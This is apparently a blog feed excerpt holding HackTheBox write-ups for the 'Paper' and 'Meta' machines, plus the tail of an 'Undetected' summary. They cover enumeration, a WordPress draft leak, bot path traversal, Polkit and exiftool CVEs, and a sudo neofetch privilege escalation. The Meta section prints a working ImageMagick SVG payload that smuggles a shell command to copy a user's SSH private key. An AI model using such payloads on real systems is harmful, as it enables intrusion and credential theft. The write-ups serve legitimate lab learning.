<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Discovered port <strong>22</strong>, and <strong>80</strong> using <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Found a subdomain <strong>store.djewelry.htb</strong>
    <ul>
      <li>Brute forced the directory <code class="language-plaintext highlighter-rouge">vendor/</code> which contains some PHP libraries.</li>
      <li>Used one of the libraries, <code class="language-plaintext highlighter-rouge">phpunit</code>, to execute code on the server as <strong>www-data</strong>.</li>
    </ul>
  </li>
  <li>Inside as <code class="language-plaintext highlighter-rouge">www-data</code>
    <ul>
      <li>Found a binary at <code class="language-plaintext highlighter-rouge">/var/backups/info</code>.</li>
      <li>Recovered a hash from it, which was cracked to gain access to the account of <strong>steven</strong>.</li>
    </ul>
  </li>
  <li>Inside as <strong>steven</strong>
    <ul>
      <li>Found an email for <strong>steven</strong> talking about issues with Apache2.</li>
      <li>Found a binary at <code class="language-plaintext highlighter-rouge">/etc/apache2/mods-available/mod_reader.o</code>, which lead to a backdoored SSH daemon identified as <strong>SSHDoor</strong> using Virus Total.</li>
      <li>Reverse engineered the binary to recover the hardcoded password for <strong>root</strong> access.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="php" /><category term="rce" /><category term="malware" /><category term="backdoor" /><category term="reverse engineering" /><category term="apache" /><category term="sshdoor" /><category term="radare2" /><category term="python" /><summary type="html"><![CDATA[Undetected is a fun medium linux box that will have you working on the trail of an attacker. Foothold is pretty easy as the site is using a PHP library that allows for RCE. Once on the box, you will need to recover the password of a local user account from a binary that was dropped by the attacker. PrivEsc is through a backdoored SSH daemon (SSHDoor).]]></summary></entry><entry><title type="html">Paper - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/paper.html" rel="alternate" type="text/html" title="Paper - HackTheBox" /><published>2022-06-18T00:00:00+01:00</published><updated>2022-06-18T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/paper</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/paper.html"><![CDATA[<p><strong>Paper</strong> is a nice and easy linux box. It starts with a wordpress site that can be exploited to leak user drafts, which will lead you to an instance of <em>RocketChat</em> with a custom bot that’s vulnerable to path traversal. Privesc is through a CVE affecting Polkit.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/20220210063737.png" alt="" /></p>

<p><img src="/assets/img/20220210063801.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>

<pre><code class="language-raw"># Nmap 7.70 scan initiated Sun Feb  6 02:17:09 2022 as: nmap -sC -sC -oN nmap.txt -v 10.10.11.143
Nmap scan report for 10.10.11.143
Host is up (0.23s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-title: HTTP Server Test Page powered by CentOS
443/tcp open  https
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-title: HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Issuer: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-07-03T08:52:34
| Not valid after:  2022-07-08T10:32:34
| MD5:   579a 92bd 803c ac47 d49c 5add e44e 4f84
|_SHA-1: 61a2 301f 9e5c 2603 a643 00b5 e5da 5fd5 c175 f3a9
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Feb  6 02:18:44 2022 -- 1 IP address (1 host up) scanned in 95.12 seconds

</code></pre>

<p><br /></p>

<h4 id="web">Web</h4>

<p><img src="/assets/img/20220210064120.png" alt="" /></p>

<p>Checking my Burp Suite logs, one header stood out;</p>

<p><img src="/assets/img/20220210064528.png" alt="" /></p>

<p>A quick googling told me that;</p>

<blockquote>
  <p>x-backend-server header is used to return the name of the back end webserver that may sit behind load balancer server</p>
</blockquote>

<p>The server is listening on both port <strong>80</strong> and <strong>443</strong>, so I was expecting port <strong>80</strong> to be redirecting to <strong>443</strong>, but it isn’t. Sending a request over HTTPs (PORT <strong>443</strong>) loads the same page, but with the <strong>X-Backend-Server</strong> header removed. So I am assuming the service on port <strong>80</strong> is acting as a proxy;</p>

<p><img src="/assets/img/20220210065044.png" alt="" /></p>

<p>I added the <strong>office.paper</strong> hostname to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file, and got a different page;</p>

<p><img src="/assets/img/20220210065336.png" alt="" /></p>

<p>The bottom part of the page (comments and search field) hints at a wordpress site, and sure enough, it is one;</p>

<p><img src="/assets/img/20220210065526.png" alt="" /></p>

<p><br /></p>

<h4 id="officepaper">OFFICE.PAPER</h4>

<p>This is probably the only user, and likely the admin user because the user <strong>admin</strong> may not exist according to the password reset page, and a blog post;</p>

<p><img src="/assets/img/20220210070239.png" alt="" /></p>

<p><em>Wappalyzer</em> identified the wordpress version as <strong>5.2.3</strong>;</p>

<p><img src="/assets/img/20220210070626.png" alt="" /></p>

<p>There is an interesting comment from a user named <strong>nick</strong>;</p>

<p><img src="/assets/img/20220210070828.png" alt="" /></p>

<p>Testing the username in the <code class="language-plaintext highlighter-rouge">wp-login.php</code> page, it indicate the user exists.</p>

<p>I updated my <code class="language-plaintext highlighter-rouge">wpscan</code>, and load my API token to scan the website for known vulnerabilities. <strong>31</strong> vulns were identified, but one in particular caught my attention;</p>

<p><img src="/assets/img/20220210153240.png" alt="" /></p>

<p>Remember earlier <strong>nick</strong> was warning <strong>prisonmike</strong> (Michael) about saving sensitive data in drafts? The above vuln claims that private posts or drafts can be viewed by unauthenticated users. Going to the first link https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2, I found a simple PoC URL, which worked when requesting <code class="language-plaintext highlighter-rouge">http://office.paper/?static=1</code>;</p>

<p><img src="/assets/img/20220210153716.png" alt="" /></p>

<p>Note that the above revealed hidden domain on the site, so I updated my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file with it. The URL http://chat.office.paper/register/8qozr226AhkCHZdyY looks interesting as it looks like we can use it to create an account on the service. Going to the homepage, I got this page;</p>

<p><img src="/assets/img/20220210154214.png" alt="" /></p>

<p>Sure enough, going to the URL found using the draft leak, I was presented with a registration form;</p>

<p><img src="/assets/img/20220210154612.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="rocketchat">RocketChat</h3>
<p><br /></p>

<p>Following successful sign up, I was logged into the chat service. There is a channel named <em>general</em> which contains a few messages;</p>

<p><img src="/assets/img/20220210155734.png" alt="" /></p>

<p>Going through the chat log, I found out there is a bot in the channel with the name <strong>recyclops</strong>;</p>

<p><img src="/assets/img/20220210160107.png" alt="" /></p>

<p>The bot has a help page that showed an interesting feature that could be used to read files on the server;</p>

<p><img src="/assets/img/20220210160209.png" alt="" /></p>

<p>I don’t have permissions to send message in the <em>General</em> channel, but I can send a direct message to the bot by clicking on it’s profile and clicking the message icon. I used the <code class="language-plaintext highlighter-rouge">list sale</code> command to list files available as specified by the bot. The output look similar to that generated by the shell command <code class="language-plaintext highlighter-rouge">ls</code>;</p>

<p><img src="/assets/img/20220210161154.png" alt="" /></p>

<p>I tested for <em>path traversal</em>, and it turned out to be vulnerable. It looks like I have acces to the home directory of a user named <strong>dwight</strong>;</p>

<p><img src="/assets/img/20220210161312.png" alt="" /></p>

<p>There is no SSH key for the user in the <code class="language-plaintext highlighter-rouge">.ssh</code> directory. Attempts to inject shell commands into the <code class="language-plaintext highlighter-rouge">ls</code> command used to list directories kept getting detected;</p>

<p><img src="/assets/img/20220210162350.png" alt="" /></p>

<p>So I started hunting for the source code of the bot, and found it at <code class="language-plaintext highlighter-rouge">../hubot</code>. The file <code class="language-plaintext highlighter-rouge">hubot/scripts/files.js</code> is the one detecting our command injections;</p>

<p><img src="/assets/img/20220210162620.png" alt="" /></p>

<p>I spent some time working on a way to bypass the filter, but I couldn’t, so I moved on. Dumping the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file showed that local users <strong>rocketchat</strong> and <strong>dwight</strong> exist. Looking the the source directory of <code class="language-plaintext highlighter-rouge">hubot</code>, I found a credential inside <code class="language-plaintext highlighter-rouge">hubot/.env</code> file;</p>

<p><img src="/assets/img/20220210214843.png" alt="" /></p>

<p>Testing the password against the local users via SSH, I was able to login to the account of <strong>dwight</strong> and obtain the user flag;</p>

<p><img src="/assets/img/20220210214933.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>The user <strong>dwight</strong> does not have any sudo permissions in the box. For some reasons I could not run <code class="language-plaintext highlighter-rouge">pspy</code> in the host, as it just hangs without displaying any processes. <code class="language-plaintext highlighter-rouge">linPEAS</code> also didn’t work at first, until after I updated it, and even then it took very long to finish. Since this box was released after <strong>pwnkit</strong>, I looked at <code class="language-plaintext highlighter-rouge">/usr/bin/pkexec</code>, and the date indicates it may be vulnerable. I had to rely on modification date of the binary because the patch released for <em>pwnkit</em> did not increment the version number;</p>

<p><img src="/assets/img/20220211173419.png" alt="" /></p>

<p>The <strong>pwnkit</strong> vuln seems to be mitigated by stripping the binary of <em>SUID</em> permissions, which pretty much breaks it. I started looking for exploit for this, and found a GitHub repo at https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation by a user named <strong>secnigma</strong>, which is interesting because that’s the author of the box.</p>

<p>The exploit did not work after multiple tries, so I started looking for another more reliable PoC. I found this: https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py</p>

<p>Running the python script in the box, I got root on the first attempt;</p>

<p><img src="/assets/img/20220211174234.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Found open ports: <strong>22</strong>, <strong>80</strong>, and <strong>443</strong></li>
  <li>Identified a hidden subdomain <strong>office.paper</strong> in <code class="language-plaintext highlighter-rouge">X-Backend-Server</code> header.</li>
  <li><strong>office.paper</strong>
    <ul>
      <li>This was found to be a <em>wordpress</em> site.</li>
      <li>Exploited a wordpress vulnerability that leaks private drafts/posts of users.</li>
      <li>Leaked draft revealed a subdomain <strong>chat.office.paper</strong>.</li>
    </ul>
  </li>
  <li><strong>chat.office.paper</strong>
    <ul>
      <li>Running an instance of <em>RocketChat</em>.</li>
      <li>Exploited a bot to read arbitrary files on the server.</li>
      <li>Read a config file that contains a password, which gave access to the box over SSH as the user <strong>dwight</strong></li>
    </ul>
  </li>
  <li>Inside as <strong>dwight</strong>
    <ul>
      <li>Exploited a CVE to gain code execution as root.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="wordpress" /><category term="custom exploitation" /><category term="rocketchat" /><category term="pwnkit" /><summary type="html"><![CDATA[Paper is a nice and easy linux box. It starts with a wordpress site that can be exploited to leak user drafts, which will lead you to an instance of RocketChat with a custom bot that’s vulnerable to path traversal. Privesc is through a CVE affecting Polkit.]]></summary></entry><entry><title type="html">Meta - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/meta.html" rel="alternate" type="text/html" title="Meta - HackTheBox" /><published>2022-06-10T00:00:00+01:00</published><updated>2022-06-10T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/meta</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/meta.html"><![CDATA[<p><strong>Meta</strong> is a pretty easy <em>medium-rated</em> box on <em>HackTheBox</em>. It starts with a website that allows for image uploads, which can be exploited to gain RCE using an <code class="language-plaintext highlighter-rouge">exiftool</code> CVE. User access is also another CVE targeting <em>ImageMagick</em>, and privesc to root is through a vulnerable sudo configuration on <code class="language-plaintext highlighter-rouge">neofetch</code>, which allows you to hijack the configuration file used by the program.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/20220210004831.png" alt="" /></p>

<p><img src="/assets/img/20220210004850.png" alt="" /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>

<pre><code class="language-raw"># Nmap 7.70 scan initiated Sat Jan 29 07:22:30 2022 as: nmap -sS -sV -oN nmap.txt -v meta.htb
Nmap scan report for meta.htb (10.10.11.140)
Host is up (0.26s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 29 07:24:32 2022 -- 1 IP address (1 host up) scanned in 122.32 seconds
</code></pre>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p>Redirects to <strong>artcorp.htb</strong>.</p>

<p><img src="/assets/img/20220210005037.png" alt="" /></p>

<p>Bruteforcing with <code class="language-plaintext highlighter-rouge">ffuf</code> revealed a subdomain: <strong>dev01.artcorp.htb</strong>;</p>

<p><img src="/assets/img/20220210005302.png" alt="" /></p>

<p>The page links to <code class="language-plaintext highlighter-rouge">/metaview/</code>, which provides a form for image upload;</p>

<p><img src="/assets/img/20220210005407.png" alt="" /></p>

<p>After uploading an image, I got an output that resembles the one generated by <code class="language-plaintext highlighter-rouge">exiftool</code>;</p>

<p><img src="/assets/img/20220210005546.png" alt="" /></p>

<p>I started bruteforcing the for hidden directories in hope of finding where the files are uploaded, but was unsuccessful.</p>

<p>Searching for exploits targeting <code class="language-plaintext highlighter-rouge">exiftool</code>, <strong>CVE-2021-22204</strong> caught my attention, and I found a PoC at https://github.com/convisolabs/CVE-2021-22204-exiftool</p>

<p>I edited the <code class="language-plaintext highlighter-rouge">exploit.py</code> file with my host info, and then execute it to generate a malicious JPG file;</p>

<p><img src="/assets/img/20220210010059.png" alt="" /></p>

<p>I uploaded the file to the server, and gained code execution as <strong>www-data</strong>;</p>

<p><img src="/assets/img/20220210010238.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="user">User</h3>
<p><br /></p>

<p>Listing the <code class="language-plaintext highlighter-rouge">/home</code> directory showed that a local user named <strong>thomas</strong> exist. Nothing of importance could be obtained from the source files of the web app, and I couldn’t find anything of interest in the output of <code class="language-plaintext highlighter-rouge">linpeas</code>.</p>

<p>Running <code class="language-plaintext highlighter-rouge">pspy</code> on the host, I identified a cron task that runs as <strong>thomas</strong> and execute the script <code class="language-plaintext highlighter-rouge">/usr/local/bin/convert_images.sh</code>;</p>

<p><img src="/assets/img/20220210010937.png" alt="" /></p>

<p>The script is a simple bash script that uses <code class="language-plaintext highlighter-rouge">mogrify</code>, which is a tool of <em>ImageMagick</em> that is used to convert all files in a directory to <code class="language-plaintext highlighter-rouge">.png</code>;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="nb">cd</span> /var/www/dev01.artcorp.htb/convert_images/ <span class="o">&amp;&amp;</span> /usr/local/bin/mogrify <span class="nt">-format</span> png <span class="k">*</span>.<span class="k">*</span> 2&gt;/dev/null
pkill mogrify
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The user <code class="language-plaintext highlighter-rouge">www-data</code> that I am working as has write permissions in the directory from where images are converted;</p>

<p><img src="/assets/img/20220210011257.png" alt="" /></p>

<p>I identified the version of <em>ImageMagick</em> installed, and began hunting for exploits;</p>

<p><img src="/assets/img/20220210011431.png" alt="" /></p>

<p>After a couple of searches, I found a nice PoC at https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html that injects a shell command in the <code class="language-plaintext highlighter-rouge">authenticate</code> attribute of the <code class="language-plaintext highlighter-rouge">image</code> tag of an <code class="language-plaintext highlighter-rouge">.svg</code> file, which I edited to load the SSH private key of <strong>thomas</strong>;</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;image</span> <span class="na">authenticate=</span><span class="s">'ff" `echo $(cat /home/thomas/.ssh/id_rsa)&gt; /dev/shm/pwned`;"'</span><span class="nt">&gt;</span>
  <span class="nt">&lt;read</span> <span class="na">filename=</span><span class="s">"pdf:/etc/passwd"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;get</span> <span class="na">width=</span><span class="s">"base-width"</span> <span class="na">height=</span><span class="s">"base-height"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;resize</span> <span class="na">geometry=</span><span class="s">"400x400"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;write</span> <span class="na">filename=</span><span class="s">"test.png"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;svg</span> <span class="na">width=</span><span class="s">"700"</span> <span class="na">height=</span><span class="s">"700"</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/2000/svg"</span> <span class="na">xmlns:xlink=</span><span class="s">"http://www.w3.org/1999/xlink"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;image</span> <span class="na">xlink:href=</span><span class="s">"msl:poc.svg"</span> <span class="na">height=</span><span class="s">"100"</span> <span class="na">width=</span><span class="s">"100"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/svg&gt;</span>
<span class="nt">&lt;/image&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I copied the file to <code class="language-plaintext highlighter-rouge">/var/www/dev01.artcorp.htb/convert_images</code>, and wait. After a few seconds, the file <code class="language-plaintext highlighter-rouge">/dev/shm/pwned</code> was created with the SSH key of <strong>thomas</strong>, which I copied to my box and used to gain access to the box as <strong>thomas</strong> over SSH;</p>

<p><img src="/assets/img/20220210012154.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>The user <strong>thomas</strong> has permission to run <code class="language-plaintext highlighter-rouge">/usr/bin/neofetch</code> as root using sudo without passing any arguments. This is a program used to view system info in a nice format. Notice also that the environment variable <code class="language-plaintext highlighter-rouge">XDG_CONFIG_HOME</code> is not reset by sudo, which means we can expose it’s tampered value to sudo;</p>

<p><img src="/assets/img/20220211234832.png" alt="" /></p>

<p>The environment variable <code class="language-plaintext highlighter-rouge">$XDG_CONFIG_HOME</code> defines the directory where user-specific configuration files are stored, normally <code class="language-plaintext highlighter-rouge">/home/&lt;username&gt;/.config</code>. Checking this directory, I found the configuration file of <code class="language-plaintext highlighter-rouge">neofetch</code> at <code class="language-plaintext highlighter-rouge">.config/neofetch/config.conf</code>, and it is basically a shell script that I can write to. So I overwrote it’s content with a bash reverse shell, set the <code class="language-plaintext highlighter-rouge">$XDG_CONFIG_HOME</code> variable, and called <code class="language-plaintext highlighter-rouge">neofetch</code> with sudo;</p>

<p><img src="/assets/img/20220210013220.png" alt="" /></p>

<p>This gave me a root shell on the box;</p>

<p><img src="/assets/img/20220210013241.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Found port <strong>80</strong> and <strong>22</strong> using <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Bruteforced a subdomain <strong>dev01.artcorp.htb</strong> using <code class="language-plaintext highlighter-rouge">ffuf</code></li>
  <li>Found an image upload page used for viewing metadata using <code class="language-plaintext highlighter-rouge">exiftool</code>
    <ul>
      <li>Exploited <strong>CVE-2021-22204</strong> to gain code execution.</li>
    </ul>
  </li>
  <li>Inside as <strong>www-data</strong>
    <ul>
      <li>Identified a cron job that uses <code class="language-plaintext highlighter-rouge">mogrify</code> to convert files to <code class="language-plaintext highlighter-rouge">.png</code> in a writeable directory</li>
      <li>Exploited a shell command injection flaw using a <code class="language-plaintext highlighter-rouge">.svg</code> file to gain code execution as <strong>thomas</strong></li>
    </ul>
  </li>
  <li>Inside as <strong>thomas</strong>
    <ul>
      <li>Exploited a <code class="language-plaintext highlighter-rouge">sudo</code> permission on <code class="language-plaintext highlighter-rouge">neofetch</code> to gain code execution using malicious config file.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="exiftool" /><category term="imagemagick" /><category term="neofetch" /><category term="sudo" /><summary type="html"><![CDATA[Meta is a pretty easy medium-rated box on HackTheBox. It starts with a website that allows for image uploads, which can be exploited to gain RCE using an exiftool CVE. User access is also another CVE targeting ImageMagick, and privesc to root is through a vulnerable sudo configuration on neofetch, which allows you to hijack the configuration file used by the program.]]></summary></entry></feed>